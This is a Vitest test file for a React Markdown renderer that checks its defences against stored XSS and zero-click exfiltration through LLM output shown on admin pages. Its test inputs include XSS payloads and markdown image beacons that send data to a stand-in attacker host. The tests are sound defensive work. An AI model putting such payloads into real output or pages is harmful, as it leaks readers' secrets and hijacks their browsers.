// @vitest-environment jsdom
import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import "@testing-library/jest-dom/vitest";
import { isExternalHref, Markdown } from "../Markdown";

describe("Markdown", () => {
  it("renders ordinary markdown", () => {
    const { container } = render(<Markdown># Title</Markdown>);
    expect(container.querySelector("h1")?.textContent).toBe("Title");
  });

  it("strips embedded <script> (stored XSS sink — audit H3)", () => {
    const { container } = render(
      <Markdown>{`hello <script>window.__xss = 1</script> world`}</Markdown>,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(
      (window as unknown as Record<string, unknown>).__xss,
    ).toBeUndefined();
  });

  it("drops javascript: URLs on links", () => {
    const { container } = render(
      <Markdown>{`[click](javascript:alert(1))`}</Markdown>,
    );
    const href = container.querySelector("a")?.getAttribute("href") ?? "";
    expect(href.toLowerCase()).not.toContain("javascript:");
  });

  it("preserves <br> (line breaks must survive sanitization)", () => {
    const { container } = render(<Markdown>{`line1<br>line2`}</Markdown>);
    expect(container.querySelector("br")).not.toBeNull();
  });

  it("renders GFM tables (remark-gfm stays enabled)", () => {
    const { container } = render(
      <Markdown>{`| a | b |\n| - | - |\n| 1 | 2 |`}</Markdown>,
    );
    expect(container.querySelector("table")).not.toBeNull();
    expect(container.querySelectorAll("td")).toHaveLength(2);
  });

  it("applies caller element renderers without exposing plugins", () => {
    const { container } = render(
      <Markdown
        components={{
          strong: ({ children }) => (
            <strong data-testid="custom">{children}</strong>
          ),
        }}
      >
        {`**bold**`}
      </Markdown>,
    );
    expect(container.querySelector('[data-testid="custom"]')?.textContent).toBe(
      "bold",
    );
  });

  it("routes ```mermaid fences to the diagram renderer (not a raw code block)", () => {
    const { container } = render(
      <Markdown>{"```mermaid\ngraph LR\n  A --> B\n```"}</Markdown>,
    );
    // The `pre` override intercepts mermaid and delegates to <MermaidDiagram>,
    // so react-markdown's default `code.language-mermaid` element must be absent.
    expect(container.querySelector("code.language-mermaid")).toBeNull();
  });

  it("keeps ordinary code fences as code blocks", () => {
    const { container } = render(
      <Markdown>{"```js\nconst a = 1;\n```"}</Markdown>,
    );
    const code = container.querySelector("pre code");
    expect(code).not.toBeNull();
    expect(code?.textContent).toContain("const a = 1;");
  });
});

// Audit 2026-10-06 H1: LLM output / participant reflections rendered on admin
// pages must not be able to make the admin's browser fetch an attacker URL.
describe("Markdown — exfiltration guard (audit H1)", () => {
  it("never renders a markdown image (zero-click beacon)", () => {
    const { container } = render(
      <Markdown>{`before ![](https://evil.example/?d=secret) after`}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("source")).toBeNull();
    expect(container.textContent).toContain("before");
    expect(container.textContent).toContain("after");
  });

  it("never renders a raw-HTML <img>, even with handlers stripped", () => {
    const { container } = render(
      <Markdown>{`<img src="https://evil.example/x" onerror="window.__xss = 1">`}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(
      (window as unknown as Record<string, unknown>).__xss,
    ).toBeUndefined();
  });

  it("a caller cannot reinstate <img> through `components`", () => {
    const { container } = render(
      <Markdown
        components={{
          // biome-ignore lint/performance/noImgElement: deliberately tries to smuggle a raw <img> past the guard
          img: (props) => <img data-testid="smuggled" alt="" {...props} />,
        }}
      >
        {`![](https://evil.example/?d=secret)`}
      </Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector('[data-testid="smuggled"]')).toBeNull();
  });

  it("marks external links visibly, opens them in a new tab with a safe rel", () => {
    const { container } = render(
      <Markdown>{`[report](https://evil.example/?d=secret)`}</Markdown>,
    );
    const a = container.querySelector("a");
    expect(a).not.toBeNull();
    expect(a?.getAttribute("href")).toBe("https://evil.example/?d=secret");
    expect(a?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(a?.getAttribute("target")).toBe("_blank");
    expect(a?.getAttribute("data-external-link")).toBe("true");
    expect(a?.getAttribute("title")).toContain(
      "https://evil.example/?d=secret",
    );
    expect(a?.textContent).toContain("↗");
    expect(a?.textContent).toContain("外部リンク");
  });

  it("keeps internal links unmarked but still sets the safe rel", () => {
    const { container } = render(
      <Markdown>{`[in-app](/sessions/abc) and [anchor](#top)`}</Markdown>,
    );
    const anchors = Array.from(container.querySelectorAll("a"));
    expect(anchors).toHaveLength(2);
    for (const a of anchors) {
      expect(a.getAttribute("rel")).toBe("noopener noreferrer nofollow");
      expect(a.getAttribute("data-external-link")).toBeNull();
      expect(a.textContent).not.toContain("↗");
    }
  });

  it("a caller cannot replace the link renderer", () => {
    const { container } = render(
      <Markdown
        components={{
          a: ({ children, href }) => (
            <a href={href} data-testid="unsafe">
              {children}
            </a>
          ),
        }}
      >
        {`[x](https://evil.example/)`}
      </Markdown>,
    );
    const a = container.querySelector("a");
    expect(a?.getAttribute("data-testid")).toBeNull();
    expect(a?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
  });

  it("classifies hrefs", () => {
    expect(isExternalHref("https://example.com")).toBe(true);
    expect(isExternalHref("HTTP://example.com")).toBe(true);
    expect(isExternalHref("//example.com/x")).toBe(true);
    expect(isExternalHref("mailto:a@b.c")).toBe(true);
    expect(isExternalHref("/sessions/x")).toBe(false);
    expect(isExternalHref("#section")).toBe(false);
    expect(isExternalHref("relative/path")).toBe(false);
    expect(isExternalHref(undefined)).toBe(false);
  });
});
